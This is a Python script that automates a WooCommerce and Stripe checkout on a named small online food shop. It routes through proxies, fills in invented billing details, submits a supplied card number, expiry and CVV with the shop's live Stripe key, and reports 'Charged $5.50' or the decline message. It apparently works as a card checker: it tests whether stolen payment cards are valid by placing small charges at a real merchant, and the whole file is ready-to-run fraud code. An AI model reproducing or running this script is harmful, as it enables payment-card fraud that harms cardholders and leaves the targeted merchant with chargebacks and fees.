import requests,re,json,time,random
from datetime import datetime
from proxy import proxies
r = requests.session()
def find_between(text, startStr, endStr):
    startIndex = text.find(startStr)
    if startIndex == -1:
        return ""
    startIndex += len(startStr)
    endIndex = text.find(endStr, startIndex)
    if endIndex == -1:
        return ""

    extracted_text = text[startIndex:endIndex].strip()
    cleaned_text = re.sub(r'[\s]+', ' ', extracted_text)
    
    return cleaned_text.strip()


async def stripe_charge(cc,mm, yy, cvv):
    if len(yy) == 4:
        yy = yy[-2:]
    proxy = proxies()
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://charliesfinefoodco.com',
        'priority': 'u=1, i',
        'referer': 'https://charliesfinefoodco.com/product/apple-crumble-bikkie-bites/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'action': 'jet_woo_builder_add_cart_single_product',
    'add-to-cart': '16387',
    'quantity': '1'
    }
    try:
        response = r.post('https://charliesfinefoodco.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxy)
    except:
        return "Failed to add item to cart"
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://charliesfinefoodco.com/product/apple-crumble-bikkie-bites/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://charliesfinefoodco.com/checkout/', headers=headers, proxies=proxy)
        checkout_nonce = re.findall(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)[0]
        security = re.findall(r'update_order_review_nonce":\s*"([^"]+)"', response.text)[0]
    except:
        return "Failed to get checkout nonce"
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://charliesfinefoodco.com',
        'priority': 'u=1, i',
        'referer': 'https://charliesfinefoodco.com/checkout/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'update_order_review',
    }

    data = f'security={security}&payment_method=stripe&country=AU&state=NSW&postcode=5389&city=Adelaide&address=4315+Mcgowen+St&address_2=&s_country=AU&s_state=NSW&s_postcode=5389&s_city=Adelaide&s_address=4315+Mcgowen+St&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fcharliesfinefoodco.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2024-09-23%252013%253A31%253A22%26wc_order_attribution_session_pages%3D1%26wc_order_attribution_session_count%3D2%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F128.0.0.0%2520Safari%252F537.36%26billing_first_name%3DAlbedo%26billing_last_name%3DJones%26billing_country%3DAU%26billing_address_1%3D4315%2520Mcgowen%2520St%26billing_city%3DAdelaide%26billing_state%3DNSW%26billing_postcode%3D5389%26billing_company%3D%26billing_address_2%3D%26billing_phone%3D8562247878%26billing_email%3Drkjnjfjbbbfghurgfr%2540gmail.com%26shipping_first_name%3DAlbedo%26shipping_last_name%3DJones%26shipping_company%3D%26shipping_country%3DAU%26shipping_address_1%3D4315%2520Mcgowen%2520St%26shipping_address_2%3D%26shipping_city%3DAdelaide%26shipping_state%3DNSW%26shipping_postcode%3D5389%26order_comments%3D%26shipping_method%255B0%255D%3Dlocal_pickup%253A2%26payment_method%3Dstripe%26email_optin%3D1%26woocommerce-process-checkout-nonce%3D{checkout_nonce}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review%26pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_content%253Aundefined%257Cutm_term%253Aundefined%26pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined%26pys_browser_time%3D20-21%257CMonday%257CSeptember%26pys_landing%3Dhttps%253A%252F%252Fcharliesfinefoodco.com%252Fcart%252F%26pys_source%3Ddirect%26pys_order_type%3Dnormal%26last_pys_landing%3Dhttps%253A%252F%252Fcharliesfinefoodco.com%252Fcart%252F%26last_pys_source%3Ddirect%26last_pys_utm%3Dutm_source%253Aundefined%257Cutm_medium%253Aundefined%257Cutm_campaign%253Aundefined%257Cutm_content%253Aundefined%257Cutm_term%253Aundefined%26last_pys_utm_id%3Dfbadid%253Aundefined%257Cgadid%253Aundefined%257Cpadid%253Aundefined%257Cbingid%253Aundefined&shipping_method%5B0%5D=local_pickup%3A2'
    try:
        response = r.post('https://charliesfinefoodco.com/', params=params, headers=headers, data=data, proxies=proxy)
    except:
        return "Failed to update order review"
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    data = f'type=card&billing_details[name]=Albedo+Jones&billing_details[address][line1]=4315+Mcgowen+St&billing_details[address][state]=NSW&billing_details[address][city]=Adelaide&billing_details[address][postal_code]=5389&billing_details[address][country]=AU&billing_details[email]=rkjnjfjbbbfghurgfr%40gmail.com&billing_details[phone]=8562247878&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=a3b0ef5c-15fa-46a9-bda4-16cdd3608e2b98ead9&muid=0c3f3785-c7f0-4d84-955a-aba46f2c2df207ecb0&sid=3454c7dd-43c7-45df-9429-03f5c4e799e31106d5&pasted_fields=number&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+split-card-element&referrer=https%3A%2F%2Fcharliesfinefoodco.com&time_on_page=510387&key=pk_live_51MU099CtNIreatxhlm0HwqraJ3rrMcucPgcfObcg5r5YyODRXGEceBxswFS1I1f24iuCSZOi2yBicdzMHxpTvT1J00NE4Ir128'
    try:
        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy)
        pm = response.json().get('id')
    except:
        return "Failed to create payment method"  
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://charliesfinefoodco.com',
        'priority': 'u=1, i',
        'referer': 'https://charliesfinefoodco.com/checkout/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = {
        "wc_order_attribution_source_type": "typein",
        "wc_order_attribution_session_entry": "https://charliesfinefoodco.com/cart/",
        "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "wc_order_attribution_session_pages": "1",
        "wc_order_attribution_session_count": "2",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "billing_first_name": "Albedo",
        "billing_last_name": "Jones",
        "billing_country": "AU",
        "billing_address_1": "4315 Mcgowen St",
        "billing_city": "Adelaide",
        "billing_state": "NSW",
        "billing_postcode": "5389",
        "billing_company": "",
        "billing_address_2": "",
        "billing_phone": "8562247878",
        "billing_email": "rkjnjfjbbbfghurgfr@gmail.com",
        "shipping_first_name": "Albedo",
        "shipping_last_name": "Jones",
        "shipping_company": "",
        "shipping_country": "AU",
        "shipping_address_1": "4315 Mcgowen St",
        "shipping_address_2": "",
        "shipping_city": "Adelaide",
        "shipping_state": "NSW",
        "shipping_postcode": "5389",
        "order_comments": "",
        "shipping_method[0]": "local_pickup:2",
        "payment_method": "stripe",
        "email_optin": "1",
        "woocommerce-process-checkout-nonce": checkout_nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "stripe_source": pm,
    }
    try:
        response = r.post('https://charliesfinefoodco.com/', params=params,  headers=headers, data=data,proxies=proxy)
        resp = json.loads(response.text)
        if resp['result'] == "failure":
            message = find_between(resp['messages'], '<li>', '</li>')
            return message
        else:
            return "Charged $5.50"
    except:
        return "Failed to checkout"
